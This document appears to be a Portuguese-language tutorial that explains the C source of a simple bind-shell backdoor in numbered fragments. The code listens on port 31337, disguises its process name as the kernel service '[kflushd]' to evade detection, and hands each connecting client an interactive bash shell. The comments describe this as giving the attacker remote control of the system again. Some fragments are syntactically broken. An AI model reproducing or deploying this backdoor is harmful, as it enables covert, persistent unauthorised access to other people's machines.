# Backdoor.c
Simple backdoor written in C on DevC++

# 1 

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <strings.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <signal.h>

--Primeira parte do programa, definiçao das bibliotecas necessarias.

# 2 

#define MINHA_PORTA 31337; --/define a porta.
#define BACKLOG 5; --/numero maximo de conexoes

# 3 

 struct sockaddr_in local; / Estrutura local
  struct sockaddr_in remote; / Estrutura remota

# 4 

strcpy(argv[0], "[kflushd]");
 
--/realiza a copia de "kflushd" para argv[0]: kflushd basicamente é o nome de um serviço no kernel do linux, fazendo com que quando realizado a busca por programas ativos na memoria
 não será exibido um nome "estranho"

# 5 

            Meusocket = socket(AF_INET, SOCK_STREAM, 0);
            bind(Meusocket, (struct sockaddr *)&local, sizeof(struct sockaddr));
            listen(Meusocket, BACKLOG);
            tamanho = sizeof(struct sockaddr_in);


--Define a porta a ser utilizada e o endereço da maquina host que inicializa o script.
--func. bind() e listen() sao responsaveis por ligar a porta ao programa e esperar por conxao e BACKLOG o numero de conexoes.

# 6 

 while(1)
            {
              if((Novosocket=accept(Meusocket, (struct sockaddr *)&remote, &tamanho)) == 1)
                    {
                      perror("accept");
                      exit(1); 
                      }
                      if(!fork())
                      {
                       close(0); close(1); close(2);
                       dup2(Novosocket, 0); dup2(Novosocket, 1); dup2(Novosocket, 2);
                       execl("/bin/bash","bash","-i", (char *)0);
                       close(Novosocket);
                       exit(0);
                       }
              }
  }
  
} 

 --Aceita as conexoes e disponibiliza a shell para o invasor obter o controle remoto do sistema novamente.

# 7 

    execl("/bin/bash","bash","-i", (char *)0);
    close(Novosocket);
    exit(0);
-- execuçao da shell para o atacante


# 8 

 local.sin_addr.s_addr = INADDR_ANY;  
  --define o endereço local a ser usado.

